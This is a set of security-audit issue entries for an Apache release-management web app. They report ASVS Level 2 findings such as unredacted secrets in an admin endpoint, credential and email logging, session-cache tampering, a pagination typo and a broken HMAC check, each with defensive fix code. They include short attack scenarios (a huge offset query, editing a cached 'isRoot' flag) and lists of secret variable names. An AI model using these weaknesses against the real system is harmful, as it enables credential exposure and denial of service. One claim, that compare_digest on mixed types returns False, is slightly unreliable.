**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/admin/env` endpoint returns all environment variables without redacting sensitive values. A redaction control exists in the `configuration()` function in the same file but was not applied to `env()`. Environment variables include `LDAP_BIND_PASSWORD`, `PUBSUB_PASSWORD`, `SVN_TOKEN`, `GITHUB_TOKEN`, and other secrets. While admin access is required, compromised admin session or shoulder-surfing could leak production credentials. This violates defense in depth principles as admin access alone shouldn't expose plaintext secrets.

### Details
In `atr/admin/__init__.py`:
- `env()` endpoint - Returns all environment variables without redaction
- `configuration()` endpoint - Demonstrates proper redaction pattern

The `configuration()` function correctly:
- Identifies sensitive patterns (PASSWORD, SECRET, TOKEN, KEY)
- Replaces values with `[REDACTED]`

The `env()` function:
- Returns all environment variables unmodified
- Exposes plaintext secrets to admin users
- Does not apply redaction pattern

**Exposed secrets:**
- `LDAP_BIND_PASSWORD` - LDAP service account password
- `PUBSUB_PASSWORD` - PubSub service password
- `SVN_TOKEN` - SVN authentication token
- `GITHUB_TOKEN` - GitHub API token
- `AWS_SECRET_ACCESS_KEY` - AWS credentials (if configured)

While admin authentication is properly applied via `_check_admin_access()` blueprint guard, defense in depth argues against exposing plaintext secrets even to privileged users.

### Recommended Remediation
Apply the same redaction pattern used in `configuration()`:

```python
# In atr/admin/__init__.py

@admin.get("/env")
async def env():
    """Display environment variables with redaction."""
    # Sensitive patterns to redact
    sensitive_patterns = ('PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'CREDENTIAL', 'AUTH')
    
    env_vars = []
    for key, value in sorted(os.environ.items()):
        # Redact sensitive values
        if any(pattern in key.upper() for pattern in sensitive_patterns):
            value = '[REDACTED]'
        env_vars.append(f"{key}={value}")
    
    return template.render(
        'admin/env.html',
        title='Environment Variables',
        env_vars=env_vars
    )
```

### Acceptance Criteria
- [ ] Environment variable endpoint redacts sensitive values
- [ ] Redaction pattern matches `configuration()` endpoint
- [ ] PASSWORD, SECRET, TOKEN, KEY, CREDENTIAL patterns are redacted
- [ ] Non-sensitive environment variables are displayed normally
- [ ] Admin users are aware values are redacted (UI indication)
- [ ] Unit test verifies redaction of common secrets

### References
- Source reports: L2:13.4.5.md
- Related findings: configuration() function demonstrates proper redaction pattern
- ASVS sections: 13.4.5

### Priority
Medium

---

## Issue: FINDING-289 - Key Management Endpoints Lack Cache-Control Headers

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Endpoints displaying user SSH and OpenPGP keys lack cache-control headers. While public keys are less sensitive than private keys, they are authentication-related material tied to specific users. Cached responses could expose which keys belong to which users. For shared/misconfigured caching infrastructure, could serve user A's keys to user B. This issue is part of a broader caching problem covered by FINDING-XXX (ASVS-1422-HIGH-001) which provides a global fix.

### Details
In `atr/get/keys.py`:
- `keys()` function - Lists user's SSH and OpenPGP keys
- `details()` function - Shows key details including fingerprint
- `export()` function - Exports public key material

These endpoints lack HTTP cache-control headers:
- No `Cache-Control: no-store, no-cache`
- No `Pragma: no-cache`
- No `Expires: 0`

While public keys are intended to be public, the association between keys and specific users is sensitive. Caching could:
- Expose user-key associations to wrong users
- Serve stale key data after revocation
- Leak key material through shared caches

### Recommended Remediation
This issue will be addressed by the global fix in FINDING-XXX (ASVS-1422-HIGH-001) which adds cache-control headers to all authenticated endpoints via `after_request` hook.

**If global fix is not implemented**, add headers to these specific endpoints:
```python
# In atr/get/keys.py
from quart import make_response

@keys.get("/")
async def keys(session: web.Committer):
    # ... existing logic ...
    response = await make_response(template.render(...))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response
```

### Acceptance Criteria
- [ ] Key management endpoints include cache-control headers
- [ ] Headers prevent caching of user-key associations
- [ ] Consistent with global caching policy (if implemented)
- [ ] Unit test verifies cache headers presence
- [ ] Integration test confirms no caching behavior

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-HIGH-001 (global caching fix)
- ASVS sections: 14.2.2

### Priority
Medium

---

## Issue: FINDING-290 - Session Cache Persists Sensitive Data Indefinitely Without TTL

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The session cache mechanism stores user authorization data (admin privileges, committee memberships, MFA status) in a persistent JSON file without TTL or automatic purging. Stale data persists indefinitely after role changes or account deactivation. The cache stores sensitive authorization data without expiration, creating risk that revoked privileges remain cached and potentially usable if the cache is read during debug operations or cache validation logic.

### Details
In `atr/post/user.py` (lines 40-57) and `atr/util.py`:
- `session_cache_write()` - Writes cache without TTL metadata
- `session_cache_read()` - Reads cache without checking expiration
- No mechanism to automatically invalidate stale data

**Cached data:**
- `isRoot` - Admin privilege status
- `isChair` - PMC chair status
- `isMember` - ASF membership status
- `pmcs`/`projects` - Authorization data
- `mfa` - MFA enrollment status

**Risk scenarios:**
- User removed from admin list → `isRoot: true` persists in cache
- Committee membership revoked → authorization data remains cached
- Account deactivated → cached privileges remain
- Cache persists indefinitely without expiration

While the cache is not directly used for authorization decisions in production (authentication goes through LDAP), it represents sensitive data that should have TTL.

### Recommended Remediation
Add TTL metadata and purge expired entries:

```python
# In atr/post/user.py
import time

async def _cache_session(session: web.Committer) -> None:
    """Cache session data with TTL."""
    cache_data = await util.session_cache_read()
    
    session_data = {
        "uid": session.uid,
        "fullname": getattr(session, "fullname", None),
        "email": getattr(session, "email", f"{session.uid}@apache.org"),
        "isMember": getattr(session, "isMember", False),
        "isChair": getattr(session, "isChair", False),
        "pmcs": getattr(session, "committees", []),
        "projects": getattr(session, "projects", []),
        "roleaccount": getattr(session, "isRole", False),
        # Add TTL metadata
        "cached_at": int(time.time()),
        "expires_at": int(time.time()) + 3600,  # 1 hour TTL
    }
    
    # Purge expired entries while writing
    now = int(time.time())
    cache_data = {
        k: v for k, v in cache_data.items()
        if v.get("expires_at", 0) > now
    }
    
    cache_data[session.uid] = session_data
    await util.session_cache_write(cache_data)

# In atr/util.py
async def session_cache_read() -> Dict:
    """Read session cache and purge expired entries."""
    cache_data = await _read_cache_file()
    
    # Purge expired entries
    now = int(time.time())
    valid_data = {
        k: v for k, v in cache_data.items()
        if v.get("expires_at", float('inf')) > now
    }
    
    # If entries were purged, write back
    if len(valid_data) < len(cache_data):
        await _write_cache_file(valid_data)
    
    return valid_data
```

### Acceptance Criteria
- [ ] Session cache entries include TTL metadata
- [ ] Expired entries are automatically purged
- [ ] TTL is appropriate (1 hour recommended)
- [ ] Cache reads purge expired entries
- [ ] Unit test verifies TTL enforcement
- [ ] Unit test verifies automatic purging

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-LOW-008
- ASVS sections: 14.2.2

### Priority
Medium

---

## Issue: FINDING-291 - WorkflowSSHKey Entries Not Purged After Expiration

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Workflow SSH keys are temporary credentials valid for 20 minutes. The `WorkflowSSHKey` table includes an `expires` field that is checked during authentication but never used to purge expired entries from the database. Without auto-purging, database accumulates expired key material that could be exposed through database compromise or admin data browser. This violates ASVS 14.2.2 requirement to 'securely purge data after use'.

### Details
In `atr/storage/writers/ssh.py` (lines 82-86) and `atr/models/sql.py`:
- `WorkflowSSHKey` model has `expires` field
- `expires` is checked during authentication
- No purging mechanism for expired keys

**Current behavior:**
1. Workflow SSH key created with 20-minute expiration
2. Key used for authentication (expires check enforced)
3. Key expires after 20 minutes
4. **Key remains in database indefinitely**

**Accumulation:**
- Every workflow execution creates new keys
- Keys never deleted after expiration
- Database grows with expired credential material
- Could be exposed through database compromise

**Risk:**
- Database contains expired but not purged keys
- Admin data browser could expose keys
- Database backup includes expired keys
- Violates data minimization principle

### Recommended Remediation
Add periodic cleanup task to purge expired workflow SSH keys:

```python
# In atr/storage/writers/ssh.py or atr/tasks/cleanup.py
import time
import sqlmodel
from atr.models import sql
from atr import db, log

async def purge_expired_workflow_ssh_keys() -> int:
    """Delete expired WorkflowSSHKey entries. Run periodically."""
    async with db.session() as data:
        now = int(time.time())
        
        # Delete expired keys
        stmt = sqlmodel.delete(sql.WorkflowSSHKey).where(
            sql.WorkflowSSHKey.expires < now
        )
        result = await data.execute(stmt)
        await data.commit()
        
        deleted = result.rowcount
        if deleted > 0:
            log.info(f"Purged {deleted} expired workflow SSH keys")
        
        return deleted

# Schedule in task worker or before_serving hook
# In atr/server.py
@app.before_serving
async def schedule_cleanup_tasks():
    """Schedule periodic cleanup tasks."""
    async def cleanup_loop():
        while True:
            await asyncio.sleep(300)  # Every 5 minutes
            try:
                await purge_expired_workflow_ssh_keys()
            except Exception as e:
                log.error(f"Cleanup task failed: {e}")
    
    asyncio.create_task(cleanup_loop())
```

### Acceptance Criteria
- [ ] Periodic task purges expired workflow SSH keys
- [ ] Task runs every 5 minutes (or appropriate interval)
- [ ] Successful purges are logged with count
- [ ] Failed purges are logged with error
- [ ] Database does not accumulate expired keys
- [ ] Unit test verifies purging logic

### References
- Source reports: L2:14.2.2.md
- Related findings: None
- ASVS sections: 14.2.2

### Priority
Medium

---

## Issue: FINDING-292 - Full Email Content Logged at INFO Level

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Complete email messages—including headers (sender, recipient), subject, and full body text—are logged at INFO level. Email bodies contain vote details, release candidate information, user full names, and mailing list addresses. When structured logs are forwarded to centralized logging platforms, sensitive communication content reaches infrastructure that may be managed by different teams, stored in third-party logging services, or potentially exposed through log analysis tools. This violates the principle that sensitive data should not leave the application's direct control.

### Details
In `atr/mail.py`:
- Line 58: Logs full message via `log.info(msg_str)`
- Line 84: Logs full message content including body

**Logged content includes:**
- Email headers (From, To, Subject)
- Full email body text
- Vote details and results
- Release candidate information
- User full names
- Mailing list addresses
- Internal deliberations

**Risk when logs are centralized:**
- Logs forwarded to CloudWatch, Datadog, Splunk, ELK, etc.
- Different teams have access to logging infrastructure
- Third-party logging services store content
- Different retention and access policies
- Log analysis tools index email content
- SIEM systems aggregate communication data

This violates principle that sensitive communication should not leave application's direct control through logging infrastructure.

### Recommended Remediation
Replace full email content logging with metadata-only logging:

```python
# In atr/mail.py

# REMOVE: log.info(msg_str)

# REPLACE WITH: Metadata-only logging
log.info("Sending email",
         recipient=msg_data.email_recipient,
         subject=msg_data.subject,
         message_id=mid,
         # DO NOT LOG: body content
)
```

**Alternative approach with additional metadata:**
```python
log.info("Sending email",
         recipient_domain=msg_data.email_recipient.split('@')[1],  # Domain only
         subject_prefix=msg_data.subject.split(':')[0],  # Prefix only
         body_length=len(msg_data.body),
         message_id=mid)
```

If debugging requires full content, use DEBUG level and document that DEBUG logs contain sensitive data and should not be forwarded to centralized logging.

### Acceptance Criteria
- [ ] Email body content is not logged at INFO level
- [ ] Email logging includes metadata only (recipient, subject, message_id)
- [ ] Full content logging is removed or moved to DEBUG level
- [ ] Documentation explains logging policy for emails
- [ ] Centralized logging configuration excludes DEBUG level (if used)
- [ ] Unit test verifies metadata-only logging

### References
- Source reports: L2:14.2.3.md
- Related findings: None
- ASVS sections: 14.2.3

### Priority
Medium

---

## Issue: FINDING-293 - JWT Claims Including PAT Hash Logged at Debug Level

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
JWT claims including 'jti' (unique token ID) and 'atr_th' (SHA3-256 hash of PAT) are logged at debug level during token verification. While debug logging is typically disabled in production, enabling it during troubleshooting exposes sensitive authentication data. PAT hashes exposed in logs enable correlation with stored hashes in database, token IDs enable correlation attacks across sessions, and this represents a compliance violation for credential handling even in debug mode.

### Details
In `atr/jwtoken.py` (line 113):
```python
log.debug(f"JWT claims: {claims}")
```

This logs full JWT claims dictionary including:
- `jti` - Unique token ID (enables tracking)
- `atr_th` - SHA3-256 hash of PAT (credential material)
- `sub` - User identifier
- `iat`, `exp` - Timing information
- Others

**Risk when debug logging enabled:**
- PAT hashes can be correlated with database
- Token IDs enable cross-session correlation
- Credential hashes exposed in logs
- Compliance violation for credential logging

While debug logging should be disabled in production, defense-in-depth argues against logging credential material even at debug level.

### Recommended Remediation
Filter sensitive claims before logging:

```python
# In atr/jwtoken.py

# Create safe claims dictionary without sensitive fields
safe_claims = {k: v for k, v in claims.items() if k not in ("jti", "atr_th")}
log.debug(f"JWT claims: {safe_claims}")

# Alternative: Log claim presence without values
log.debug(f"JWT claims present: {list(claims.keys())}")
```

### Acceptance Criteria
- [ ] JWT logging filters sensitive claims (jti, atr_th)
- [ ] Debug logs do not contain credential material
- [ ] Token IDs are not logged
- [ ] PAT hashes are not logged
- [ ] Unit test verifies claim filtering
- [ ] Documentation explains debug logging policy

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-294 - Audit Log Integrity Bug — Missing f-string Prefix

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Missing 'f' prefix on audit log reason string causes literal string to be logged instead of interpolated values, compromising audit trail integrity. The audit trail for directory deletion during release promotion does not contain actual user identity or release details, compromising forensic investigation capability. Actual log output shows literal `'{self.__asf_uid}'` instead of actual username, making audit logs useless for this operation.

### Details
In `atr/storage/writers/announce.py` (line 170):
```python
reason="user {self.__asf_uid} is releasing {project_key} {version_key} {preview_revision_number}",
```

**Missing 'f' prefix:** The string should be:
```python
reason=f"user {self.__asf_uid} is releasing {project_key} {version_key} {preview_revision_number}",
```

**Current broken output:**
```
reason="user {self.__asf_uid} is releasing {project_key} {version_key} {preview_revision_number}"
```

**Intended correct output:**
```
reason="user admin123 is releasing apache-kafka 3.5.0 2"
```

This audit log bug:
- Compromises forensic investigation
- Makes audit trail useless for this operation
- Violates audit log integrity requirements
- Prevents identification of who performed the action

### Recommended Remediation
Add f-string prefix to enable variable interpolation:

```python
# In atr/storage/writers/announce.py, line 170
reason=f"user {self.__asf_uid} is releasing {project_key} {version_key} {preview_revision_number}",
```

This is a simple one-character fix that restores audit log integrity.

### Acceptance Criteria
- [ ] Audit log string includes f-string prefix
- [ ] Variable interpolation works correctly
- [ ] Actual user identity is logged
- [ ] Actual project, version, and revision are logged
- [ ] Unit test verifies audit log content
- [ ] Audit trail integrity is restored

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-295 - Sensitive Email Content Logged in Plaintext

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Full email messages including body content are logged at info level, exposing sensitive release information, security advisories, and internal discussions to anyone with log file access. This results in exposure of sensitive release information, security advisory details, internal discussions, and PII (email addresses, names) in logs. This is a duplicate of FINDING-292 but identified through a different analysis path, confirming the severity of the issue.

### Details
In `atr/mail.py` (line 87):
```python
log.info(f"sending message: {msg_str}")
```

This logs the complete email message including:
- Headers (From, To, Subject)
- **Full body content**
- Sensitive release information
- Security advisory details
- Internal PMC discussions
- PII (email addresses, names)

Anyone with access to log files can read:
- Vote deliberations
- Security vulnerability details before public disclosure
- Internal project discussions
- Personal information

### Recommended Remediation
Log only metadata instead of full message body:

```python
# In atr/mail.py, line 87
# REMOVE: log.info(f"sending message: {msg_str}")

# REPLACE WITH: Metadata-only logging
log.info(f"sending message: from={from_addr} to={to_addr} subject={msg_data.subject} mid={mid}")
```

Do NOT log the body content.

### Acceptance Criteria
- [ ] Email body content is removed from logs
- [ ] Metadata-only logging includes from, to, subject, message-id
- [ ] Sensitive content is not exposed in logs
- [ ] Log volume is reduced (side benefit)
- [ ] Unit test verifies metadata-only logging
- [ ] Consistent with FINDING-292 fix

### References
- Source reports: L2:14.2.4.md
- Related findings: FINDING-292 (same issue, different analysis)
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-296 - Environment Variables Endpoint Exposes Secrets Without Redaction

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/admin/env` endpoint exposes all environment variables without redaction, while the adjacent `/admin/configuration` endpoint properly redacts values matching sensitive patterns. Secrets configured via environment variables (`LDAP_BIND_PASSWORD`, `PUBSUB_PASSWORD`, `SVN_TOKEN`, `GITHUB_TOKEN`) are exposed to admin users in plaintext. This is a duplicate of FINDING-288 identified through a different code path, confirming the issue exists and needs remediation.

### Details
In `atr/admin/__init__.py` (lines 218-226):
- `/admin/env` endpoint returns all environment variables without redaction
- `/admin/configuration` endpoint demonstrates proper redaction pattern

The same file shows correct behavior:
```python
# configuration() endpoint - CORRECT
if any(pattern in key for pattern in sensitive_patterns):
    value = '[REDACTED]'
```

But env() endpoint lacks this protection:
```python
# env() endpoint - INCORRECT
for key, value in sorted(os.environ.items()):
    env_vars.append(f"{key}={value}")  # No redaction!
```

### Recommended Remediation
Apply redaction logic similar to `configuration()` endpoint:

```python
# In atr/admin/__init__.py
sensitive_patterns = ("PASSWORD", "KEY", "TOKEN", "SECRET", "CREDENTIAL")

for key, value in sorted(os.environ.items()):
    # Redact sensitive values
    if any(pattern in key.upper() for pattern in sensitive_patterns):
        value = "[REDACTED]"
    env_vars.append(f"{key}={value}")
```

### Acceptance Criteria
- [ ] Environment variables endpoint redacts sensitive values
- [ ] Redaction pattern matches configuration endpoint
- [ ] Common secrets are redacted (PASSWORD, KEY, TOKEN, SECRET, CREDENTIAL)
- [ ] Non-sensitive variables remain visible
- [ ] Unit test verifies redaction
- [ ] Consistent with FINDING-288 fix

### References
- Source reports: L2:14.2.4.md
- Related findings: FINDING-288 (same issue, different analysis)
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-297 - Session Cache Stores Authorization Data Without Encryption or Integrity Protection

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Session cache stores authorization-critical data (`isRoot`, `isChair`, `isMember`) and PII (fullname, email, dn) in plaintext JSON without encryption or integrity protection. Authorization-critical data is stored without encryption or integrity protection, PII is exposed to filesystem access, tampered cache data could grant privilege escalation if read in debug mode, and there is no expiration mechanism for stale data. This is related to FINDING-290 but focuses on integrity protection rather than TTL.

### Details
In `atr/post/user.py` (lines 46-62):
```python
session_data = {
    "uid": session.uid,
    "isRoot": getattr(session, "isRoot", False),
    "isChair": getattr(session, "isChair", False),
    "isMember": getattr(session, "isMember", False),
    # ... stored in plaintext JSON ...
}
```

**Security issues:**
- No encryption of sensitive data
- No integrity protection (HMAC/signature)
- Tampering not detectable
- PII exposed to filesystem access
- Authorization data could be manipulated

**Attack scenario:**
1. Attacker gains filesystem access
2. Modifies session cache JSON: `"isRoot": true`
3. If cache is read (debug operations), shows as admin
4. Potential privilege escalation vector

### Recommended Remediation
Add HMAC integrity protection and expiration:

```python
# In atr/post/user.py
import hmac, json, hashlib, time

CACHE_HMAC_KEY = config.get().CACHE_HMAC_KEY  # Add to configuration

async def _cache_session(session: web.Committer) -> None:
    """Cache session with integrity protection."""
    session_data = {
        "uid": session.uid,
        "isRoot": getattr(session, "isRoot", False),
        # ... other fields ...
    }
    
    # Add expiration
    session_data["_cached_at"] = int(time.time())
    session_data["_expires_at"] = int(time.time()) + 3600
    
    # Calculate HMAC over canonical JSON
    payload = json.dumps(session_data, sort_keys=True).encode()
    signature = hmac.new(
        CACHE_HMAC_KEY.encode(),
        payload,
        hashlib.sha256
    ).hexdigest()
    
    session_data["_hmac"] = signature
    
    cache_data[session.uid] = session_data
    await util.session_cache_write(cache_data)

# In cache read function - verify HMAC before use
async def _verify_cache_entry(entry: dict) -> bool:
    """Verify cache entry integrity and expiration."""
    # Check expiration
    if entry.get("_expires_at", 0) < int(time.time()):
        return False
    
    # Verify HMAC
    stored_hmac = entry.pop("_hmac", None)
    if not stored_hmac:
        return False
    
    payload = json.dumps(entry, sort_keys=True).encode()
    expected_hmac = hmac.new(
        CACHE_HMAC_KEY.encode(),
        payload,
        hashlib.sha256
    ).hexdigest()
    
    return hmac.compare_digest(expected_hmac, stored_hmac)
```

### Acceptance Criteria
- [ ] Session cache entries include HMAC signature
- [ ] Tampered entries are detected and rejected
- [ ] Expiration timestamp is enforced
- [ ] HMAC key is configured separately
- [ ] Unit test verifies integrity protection
- [ ] Unit test detects tampering

### References
- Source reports: L2:14.2.4.md
- Related findings: FINDING-290 (TTL issue), ASVS-1424-LOW-006
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-298 - Pagination Offset Validation Bypass Due to Typo

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Typo in attribute name check ('offest' instead of 'offset') causes offset validation to never execute, allowing unbounded database offset scans. This enables potential DoS attack vector via resource exhaustion with queries like `?offset=999999999`. This is a duplicate of FINDING-266 identified in a different analysis, confirming the critical nature of this simple typo.

### Details
In `atr/api/__init__.py`:
```python
if hasattr(query_args, "offest"):  # TYPO: should be "offset"
    offset = query_args.offset
    if offset > 1000000:
        raise exceptions.BadRequest("Maximum offset of 1000000 exceeded")
```

The typo causes:
- Validation block never executes
- No offset limit enforced
- Unbounded database scans possible
- DoS vector via resource exhaustion

### Recommended Remediation
Fix typo in validation check:

```python
# In atr/api/__init__.py
if hasattr(query_args, "offset"):  # Fixed typo
    offset = query_args.offset
    if offset > 1000000:
        raise exceptions.BadRequest("Maximum offset of 1000000 exceeded")
```

### Acceptance Criteria
- [ ] Typo corrected from 'offest' to 'offset'
- [ ] Offset validation executes correctly
- [ ] Large offsets are rejected with error
- [ ] Unit test verifies validation
- [ ] Integration test attempts large offset
- [ ] Consistent with FINDING-266 fix

### References
- Source reports: L2:14.2.4.md
- Related findings: FINDING-266 (same issue)
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-299 - HMAC Integrity Verification Function Broken

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The HMAC verification function compares base64-encoded bytes with raw decoded bytes, causing all valid signatures to be rejected. The 'expected' value is base64-encoded ASCII string while 'given_bytes' is raw decoded bytes, causing comparison to always return False. Any code relying on `Signer.verify()` will always reject valid signatures, causing either Denial of Service (if blocking) or security bypass (if verification is incorrectly assumed to work).

### Details
In `asfpy/crypto.py` (line 87):
```python
def verify(self, *args: str, given: str) -> bool:
    try:
        expected = self.sign(*args)  # Returns base64 string
        given_bytes = base64.urlsafe_b64decode(given + '==')  # Decodes to bytes
        return hmac.compare_digest(expected, given_bytes)  # MISMATCH: str vs bytes
    except (base64.binascii.Error, ValueError):
        return False
```

The bug:
- `expected` is base64-encoded string: `"abc123def456"`
- `given_bytes` is raw bytes: `b'\x69\xb7...`
- `hmac.compare_digest(str, bytes)` always returns `False`

**Result:** All valid signatures are rejected!

**Impact depends on usage:**
- If blocking: Denial of Service (legitimate requests rejected)
- If bypass exists: Security vulnerability (verification assumed but not working)

### Recommended Remediation
Compare base64 strings directly:

```python
# In asfpy/crypto.py, line 87
def verify(self, *args: str, given: str) -> bool:
    try:
        expected = self.sign(*args)  # Keep as base64 string
        return hmac.compare_digest(expected, given)  # Compare strings directly
    except (base64.binascii.Error, ValueError):
        return False
```

Do NOT decode `given` parameter—compare the base64 strings directly.

### Acceptance Criteria
- [ ] HMAC verification compares compatible types
- [ ] Valid signatures are accepted
- [ ] Invalid signatures are rejected
- [ ] Unit test verifies correct acceptance of valid signature
- [ ] Unit test verifies rejection of invalid signature
- [ ] No functional regression in signature verification

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-300 - GPG Process Debug Output Stored in Publicly Accessible Check Results

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
GPG stderr output is stored in check results that are accessible via unauthenticated API endpoint (`GET /api/checks/list/<project>/<version>`), exposing internal system paths and configuration details. Example exposed data includes temporary keyring paths (`/tmp/tmpXYZ/pubring.kbx`), trust database state, and server-side error diagnostics. This represents information disclosure that aids attackers in understanding internal system configuration.

### Details
In `atr/tasks/checks/signature.py` (lines 126-142):
```python
# GPG verification stores stderr in debug_info
if hasattr(verified, "stderr") and verified.stderr:
    debug_info["stderr"] = verified.stderr
```

The stderr output is stored in check results and exposed via public API. Example stderr content:
```
gpg: keybox '/tmp/tmp8x9yj2kl/pubring.kbx' created
gpg: assuming signed data in '/path/to/artifact'
gpg: Signature made [timestamp]
```

This reveals:
- Temporary directory paths (`/tmp/tmp8x9yj2kl/`)
- Keyring file locations
- Internal file paths
- GPG configuration details
- Server-side directory structure

### Recommended Remediation
**Option 1 (Recommended):** Remove stderr from stored results:

```python
# In atr/tasks/checks/signature.py
# Only log stderr, don't store in results
if hasattr(verified, "stderr") and verified.stderr:
    log.debug(f"GPG stderr for {signature_path}: {verified.stderr}")
    # DO NOT STORE: debug_info["stderr"] = verified.stderr
```

**Option 2:** Sanitize paths before storing:

```python
# In atr/tasks/checks/signature.py
if hasattr(verified, "stderr") and verified.stderr:
    # Sanitize paths in stderr
    sanitized = re.sub(r'/[^\s:]+', '<path>', verified.stderr)
    debug_info["stderr_sanitized"] = sanitized
```

### Acceptance Criteria
- [ ] GPG stderr is not stored in check results OR
- [ ] Paths are sanitized before storage
- [ ] Public API does not expose internal paths
- [ ] Debug logging still captures full stderr for troubleshooting
- [ ] Unit test verifies path sanitization (if Option 2)
- [ ] Integration test verifies API response doesn't contain paths

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Medium

---

## Issue: FINDING-301 - API /user/info Returns Authorization Data Without Anti-Caching Headers

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/api/user/info` endpoint returns the authenticated user's project participation and committee memberships without anti-caching headers. User's project memberships and committee participation could be cached by browsers or intermediaries, revealing organizational access levels and potentially facilitating social engineering attacks.

### Details
The endpoint at `atr/api/__init__.py` lines 1008-1020 returns `participant_of` and `member_of` lists that reveal organizational access levels. Without `Cache-Control: no-store` headers, this authorization data may be persisted in browser caches, proxy caches, or browser history, where it could be accessed by attackers with physical access or through cache forensics.

### Recommended Remediation
Change return type to `tuple[quart.Response, int]` and create a response object with `quart.jsonify()`, then set `response.headers['Cache-Control'] = 'no-store'` before returning:

```python
async def user_info(...) -> tuple[quart.Response, int]:
    # ... existing logic ...
    response = quart.jsonify(user_data)
    response.headers['Cache-Control'] = 'no-store'
    return response, 200
```

### Acceptance Criteria
- [ ] `/api/user/info` endpoint returns `Cache-Control: no-store` header
- [ ] Authorization data is not cached by browsers
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.3.2.md
- Related findings: ASVS-1432-CRI-005
- ASVS sections: 14.3.2

### Priority
Medium

---

## Issue: FINDING-302 - Session Cookie Contains PII and Authorization Data in Readable Format

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Quart's default session interface stores the complete user profile including PII (fullname, email, LDAP DN) and authorization flags (isMember, isChair, isRoot, pmcs, projects) in a signed-but-not-encrypted cookie. The base64-encoded payload can be decoded by anyone with access to the raw cookie value, violating ASVS 14.3.3 which permits only session tokens (opaque identifiers) in cookies.

### Details
Affected files:
- `src/asfquart/generics.py` lines 81-82
- `src/asfquart/session.py` lines 86-96
- `atr/admin/__init__.py` lines 130-157

The session cookie payload is signed using HMAC but not encrypted. ASVS 14.3.3 permits session tokens in cookies but not other sensitive data. A session token should be an opaque identifier referencing server-side state; here, the cookie is the session state, containing PII and authorization details including admin impersonation identity.

### Recommended Remediation
**Option A (Preferred):** Implement server-side sessions using a server-side session store (e.g., quart-session with Redis or database backend) so only an opaque session ID is stored in the cookie.

**Option B:** Encrypt the session cookie payload using `cryptography.fernet` or equivalent before signing.

**Option C (Minimum):** Allowlist session fields to store only `uid`, `cts`, and `uts` in the cookie, and perform authorization lookups server-side on each request using the `uid`.

### Acceptance Criteria
- [ ] Session cookie contains only opaque session ID or encrypted data
- [ ] PII and authorization data stored server-side
- [ ] Session validation retrieves user data from server-side store
- [ ] Unit test verifying cookie does not contain readable PII

### References
- Source reports: L2:14.3.3.md
- Related findings: ASVS-1433-LOW-002
- ASVS sections: 14.3.3

### Priority
Medium

---

## Issue: FINDING-303 - User Directory Listing Enabled Without Security Hardening

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The user directory `/~sbp/` is configured with directory listing enabled but lacks critical security hardening measures that are present in the `/downloads/` directory blocks on the same vhost. This creates an inconsistent security posture where intentional directory listings are protected differently based on their location.

### Details
Configuration in `tooling-vm-ec2-de.apache.org.yaml` for Directory Block `/~sbp/` (Path: `/home/sbp/www/`) is missing:
- No `-ExecCGI` option
- No `SetHandler none`
- No `X-Content-Type-Options: nosniff`
- No `Content-Security-Policy: sandbox`
- No `Cross-Origin-Resource-Policy`
- `+FollowSymLinks` without restrictions could expose files outside `/home/sbp/www/`

### Recommended Remediation
Apply the same security hardening as the `/downloads/` directory blocks:

```yaml
<Directory /home/sbp/www/>
    Options +Indexes +FollowSymLinks -ExecCGI
    Require all granted
    IndexOptions FancyIndexing NameWidth=* FoldersFirst ScanHTMLTitles DescriptionWidth=*
    DefaultType text/plain
    Header always set X-Content-Type-Options "nosniff"
    Header always set Content-Security-Policy "sandbox"
    Header always set Referrer-Policy "no-referrer"
    Header always set X-Frame-Options "DENY"
    Header always set Cross-Origin-Resource-Policy "same-origin"
    SetHandler none
</Directory>
```

### Acceptance Criteria
- [ ] `/~sbp/` directory block includes `-ExecCGI` option
- [ ] Security headers applied (X-Content-Type-Options, CSP, etc.)
